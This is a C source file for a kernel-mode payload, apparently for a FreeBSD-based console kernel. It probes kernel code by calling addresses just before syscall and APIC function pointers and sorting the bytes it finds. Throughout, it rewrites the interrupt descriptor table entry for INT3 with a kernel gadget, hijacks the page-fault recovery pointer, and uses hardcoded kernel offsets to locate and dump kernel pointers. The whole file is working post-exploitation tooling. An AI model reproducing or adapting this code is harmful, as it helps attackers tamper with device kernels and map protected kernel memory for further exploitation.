#include <stdint.h>

/*
 * resume_chain v10b — sysent/apic_ops single-entry byte scanner
 *
 * Probes fn-1 of a single function for C3 (ret) / CC (INT3) / fault.
 * Supports two sources: sysent table (~678 syscall entries) and
 * apic_ops table (28 LAPIC entries, backward compat with v8/v10a).
 *
 * Mode encoding via fw_ver (4 bytes from kldload):
 *   byte[0] = entry index low byte
 *   byte[1] = mode:
 *     0xAA = sysent scan
 *     0xEE = apic_ops scan (backward compat)
 *   byte[2] = entry index high byte (for sysent entries > 255)
 *   byte[3] = reserved
 *
 *   mode   = (fw_ver >> 8) & 0xFF
 *   entry  = (fw_ver & 0xFF) | (((fw_ver >> 16) & 0xFF) << 8)
 *
 * Examples:
 *   printf '\x00\xAA\x00\x00'  → sysent[0]
 *   printf '\x01\xAA\x00\x00'  → sysent[1]
 *   printf '\xFF\xAA\x00\x00'  → sysent[255]
 *   printf '\x00\xAA\x01\x00'  → sysent[256]
 *   printf '\xA5\xAA\x02\x00'  → sysent[677]
 *   printf '\x02\xEE\x00\x00'  → apic_ops[2]  (xapic_mode)
 *
 * Probe technique:
 *   1. Set IDT[3] = doreti_iret (CC bounce)
 *   2. Set pcb_onfault for #PF recovery
 *   3. Call fn-1 with RAX = 0xBAD0BAD0BAD0BAD0 (sentinel)
 *   4. Classify result:
 *      - sentinel unchanged → C3 (ret from previous function) → verdict=2
 *      - FAFA marker        → #PF caught by pcb_onfault      → verdict=3
 *      - other value        → CC bounce fired, fn executed    → verdict=1
 *
 * Output layout (uint64_t slots):
 *   [0]      = MAGIC_RSCN(lo32) | status(hi32)
 *              status: 0x010b = in-progress, 0x110b = complete
 *   [1]      = kdata_base
 *   [2]      = ktext_base
 *   [3]      = curthread
 *   [4..31]  = apic_ops[0..27] function pointers (always dumped)
 *   [32]     = step/progress counter  (offset 0x100)
 *   [33]     = entry index            (offset 0x108)
 *   [34]     = fn ptr                 (offset 0x110)
 *   [35]     = probe addr (fn-1)      (offset 0x118)
 *   [36]     = raw probe result       (offset 0x120)
 *   [37]     = verdict                (offset 0x128)
 *   [38]     = source (0=apic, 1=sys) (offset 0x130)
 *   [39]     = probe_offset (1)       (offset 0x138)
 *   [63]     = end marker             (offset 0x1F8)
 *              0xdeadbeefcafe010b
 */

#define MAGIC_RSCN       0x5253434E

/* Status codes */
#define STATUS_INPROG    0x010b
#define STATUS_DONE      0x110b
#define END_MARKER       0xdeadbeefcafe010bULL

/* kdata-relative offsets */
#define OFF_IDT          0x64cdc80
#define IDT_ENTRY_SIZE   16

/* ktext-relative offsets */
#define OFF_APIC_OPS     0x1934AC8
#define OFF_SYSENT       0x1100310

/* Sysent structure: 48 bytes per entry, sy_call at offset +8 */
#define SYSENT_SIZE      48
#define SYSENT_SYCALL    8

/* Gadget offsets (relative to kdata_base, negative = ktext) */
#define OFF_DORETI_IRET  (-0x9cf84c)

#define MSR_LSTAR        0xC0000082
#define LSTAR_OFFSET     0x294218

/* pcb_onfault discovery */
#define TD_PCB_OFF       0x3f8
#define PCB_ONFAULT_OFF  0x108

/* Sentinel values */
#define SENTINEL_RAX     0xBAD0BAD0BAD0BAD0ULL
#define FAULT_MARKER     0xFAFAFAFAFAFAFAFAULL

/* Number of apic_ops entries */
#define APIC_OPS_COUNT   28

/* Modes */
#define MODE_SYSENT      0xAA
#define MODE_APICOPS     0xEE

/* apic_ops skip mask (dangerous functions) */
#define APIC_SKIP_MASK   ((1u<<6)|(1u<<16)|(1u<<25)|(1u<<26))

/* Verdicts */
#define VERDICT_SKIP     0
#define VERDICT_CC       1   /* CC bounce: fn executed, returned a value */
#define VERDICT_C3       2   /* C3 ret: sentinel unchanged */
#define VERDICT_FAULT    3   /* #PF caught by pcb_onfault */

/* Output slot indices */
#define OUT_STATUS       0
#define OUT_KDATA        1
#define OUT_KTEXT        2
#define OUT_CURTHREAD    3
#define OUT_APIC_BASE    4   /* 4..31 = 28 apic_ops entries */
#define OUT_STEP         32  /* 0x100 */
#define OUT_ENTRY        33  /* 0x108 */
#define OUT_FN           34  /* 0x110 */
#define OUT_PROBE        35  /* 0x118 */
#define OUT_RESULT       36  /* 0x120 */
#define OUT_VERDICT      37  /* 0x128 */
#define OUT_SOURCE       38  /* 0x130 */
#define OUT_PROBEOFF     39  /* 0x138 */
#define OUT_ENDMARK      63  /* 0x1F8 */

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t *)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t *)addr = val;
}

static inline uint8_t read1(uint64_t addr)
{
    return *(volatile uint8_t *)addr;
}

static inline void write1(uint64_t addr, uint8_t val)
{
    *(volatile uint8_t *)addr = val;
}

static inline uint16_t read2(uint64_t addr)
{
    return *(volatile uint16_t *)addr;
}

static inline void write2(uint64_t addr, uint16_t val)
{
    *(volatile uint16_t *)addr = val;
}

static inline uint32_t read4(uint64_t addr)
{
    return *(volatile uint32_t *)addr;
}

static inline void write4(uint64_t addr, uint32_t val)
{
    *(volatile uint32_t *)addr = val;
}

/*
 * IDT entry manipulation
 */
static void idt_set_handler(uint64_t idt_entry_addr, uint64_t handler, uint8_t ist)
{
    uint16_t off_lo  = (uint16_t)(handler & 0xFFFF);
    uint16_t off_mid = (uint16_t)((handler >> 16) & 0xFFFF);
    uint32_t off_hi  = (uint32_t)((handler >> 32) & 0xFFFFFFFF);

    write2(idt_entry_addr + 0, off_lo);
    uint8_t byte4 = read1(idt_entry_addr + 4);
    write1(idt_entry_addr + 4, (byte4 & 0xF8) | (ist & 0x07));
    write2(idt_entry_addr + 6, off_mid);
    write4(idt_entry_addr + 8, off_hi);
}

/*
 * Probe a single ktext address for byte classification.
 *
 * Saves RBP and RBX, uses RBX to hold RSP for fault recovery.
 * This ensures both RSP and RBP are correctly restored even if
 * the target function modifies them before faulting.
 *
 * Returns:
 *   SENTINEL_RAX  = fn-1 is C3 (ret, sentinel unchanged in RAX)
 *   FAULT_MARKER  = page fault caught by pcb_onfault
 *   other         = CC bounce worked, value = function's return in RAX
 */
static uint64_t probe_byte(uint64_t target, uint64_t onfault_ptr)
{
    uint64_t rv;
    __asm__ volatile(
        /* Save callee-saved RBX and RBP, stash RSP in RBX */
        "pushq %%rbx\n"
        "pushq %%rbp\n"
        "movq %%rsp, %%rbx\n"

        /* Set pcb_onfault = recovery label */
        "leaq 1f(%%rip), %%rax\n"
        "movq %%rax, (%[of])\n"

        /* Zero all arg registers to minimize side effects */
        "xorq %%rdi, %%rdi\n"
        "xorq %%rsi, %%rsi\n"
        "xorq %%rdx, %%rdx\n"
        "xorq %%rcx, %%rcx\n"
        "xorq %%r8, %%r8\n"
        "xorq %%r9, %%r9\n"

        /* Load sentinel into RAX */
        "movabsq $0xBAD0BAD0BAD0BAD0, %%rax\n"

        /* Call target (fn-1) */
        "callq *%[fn]\n"

        /* Normal return: save result, restore regs */
        "movq %%rax, %[rv]\n"
        "popq %%rbp\n"
        "popq %%rbx\n"
        "jmp 2f\n"

        /* Fault recovery: restore RSP from RBX, then RBP and RBX */
        "1:\n"
        "movq %%rbx, %%rsp\n"
        "popq %%rbp\n"
        "popq %%rbx\n"
        "movabsq $0xFAFAFAFAFAFAFAFA, %[rv]\n"

        /* Common exit: clear pcb_onfault */
        "2:\n"
        "movq $0, (%[of])\n"

        : [rv] "=&r"(rv)
        : [fn] "r"(target), [of] "r"(onfault_ptr)
        : "rax", "rcx", "rdx", "rsi", "rdi",
          "r8", "r9", "r10", "r11", "memory"
    );
    return rv;
}

int module_start(kproc_args *args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t fw_ver = args->fw_ver;
    volatile uint64_t *out = (volatile uint64_t *)args;
    volatile uint32_t *out32 = (volatile uint32_t *)args;

    /* Clear output buffer (64 slots = 512 bytes) */
    for (int i = 0; i < 64; i++)
        out[i] = 0;

    /* Parse mode and entry index from fw_ver */
    uint32_t mode = (fw_ver >> 8) & 0xFF;
    uint32_t entry_idx = (fw_ver & 0xFF) | (((fw_ver >> 16) & 0xFF) << 8);

    /* Derive kernel bases */
    uint64_t lstar = rdmsr(MSR_LSTAR);
    uint64_t ktext_base = lstar - LSTAR_OFFSET;

    /* Write header */
    out32[0] = MAGIC_RSCN;
    out32[1] = STATUS_INPROG;
    out[OUT_KDATA] = kdata_base;
    out[OUT_KTEXT] = ktext_base;

    /* Get curthread */
    uint64_t td;
    __asm__ volatile("movq %%gs:0, %0" : "=r"(td));
    out[OUT_CURTHREAD] = td;

    /* Always dump all 28 apic_ops entries */
    uint64_t apic_ops_addr = ktext_base + OFF_APIC_OPS;
    for (int i = 0; i < APIC_OPS_COUNT; i++)
        out[OUT_APIC_BASE + i] = read8(apic_ops_addr + i * 8);

    out[OUT_STEP] = 1;  /* Step 1: init done */

    /* Compute IDT and doreti_iret addresses */
    uint64_t idt_base = kdata_base + OFF_IDT;
    uint64_t idt3_addr = idt_base + 3 * IDT_ENTRY_SIZE;
    uint64_t doreti_iret = kdata_base + (int64_t)OFF_DORETI_IRET;

    /* Save original IDT[3] */
    uint64_t orig_idt3_lo = read8(idt3_addr);
    uint64_t orig_idt3_hi = read8(idt3_addr + 8);

    /* Set IDT[3] = doreti_iret, IST=0 (for CC bounce) */
    idt_set_handler(idt3_addr, doreti_iret, 0);

    /* Get pcb_onfault address */
    uint64_t pcb = read8(td + TD_PCB_OFF);
    uint64_t onfault_ptr = pcb + PCB_ONFAULT_OFF;

    out[OUT_STEP] = 2;  /* Step 2: IDT set up */

    /* Determine function pointer to probe */
    uint64_t fn_addr = 0;
    uint32_t source = 0;

    if (mode == MODE_SYSENT) {
        /* Sysent scan: read sy_call from sysent[entry_idx] */
        uint64_t sysent_base = ktext_base + OFF_SYSENT;
        fn_addr = read8(sysent_base + (uint64_t)entry_idx * SYSENT_SIZE + SYSENT_SYCALL);
        source = 1;
    } else if (mode == MODE_APICOPS) {
        /* apic_ops backward compat */
        if (entry_idx < APIC_OPS_COUNT && !(APIC_SKIP_MASK & (1u << entry_idx))) {
            fn_addr = read8(apic_ops_addr + entry_idx * 8);
        }
        source = 0;
    }

    out[OUT_ENTRY] = entry_idx;
    out[OUT_SOURCE] = source;
    out[OUT_PROBEOFF] = 1;  /* probing fn-1 */

    out[OUT_STEP] = 3;  /* Step 3: fn resolved */

    if (fn_addr == 0) {
        /* Skip: dangerous apic_ops entry or invalid mode */
        out[OUT_FN] = 0;
        out[OUT_PROBE] = 0;
        out[OUT_RESULT] = 0;
        out[OUT_VERDICT] = VERDICT_SKIP;
    } else {
        uint64_t probe_addr = fn_addr - 1;

        out[OUT_FN] = fn_addr;
        out[OUT_PROBE] = probe_addr;

        out[OUT_STEP] = 0x100;  /* Step 0x100: probing */

        /* === PROBE === */
        uint64_t rv = probe_byte(probe_addr, onfault_ptr);

        out[OUT_RESULT] = rv;

        out[OUT_STEP] = 0x101;  /* Step 0x101: verdict */

        /* Classify result */
        if (rv == FAULT_MARKER) {
            out[OUT_VERDICT] = VERDICT_FAULT;
        } else if (rv == SENTINEL_RAX) {
            out[OUT_VERDICT] = VERDICT_C3;
        } else {
            out[OUT_VERDICT] = VERDICT_CC;
        }
    }

    out[OUT_STEP] = 4;  /* Step 4: probe complete */

    /* Restore IDT[3] */
    write8(idt3_addr, orig_idt3_lo);
    write8(idt3_addr + 8, orig_idt3_hi);

    /* Write completion */
    out32[1] = STATUS_DONE;
    out[OUT_ENDMARK] = END_MARKER;

    return 0;
}
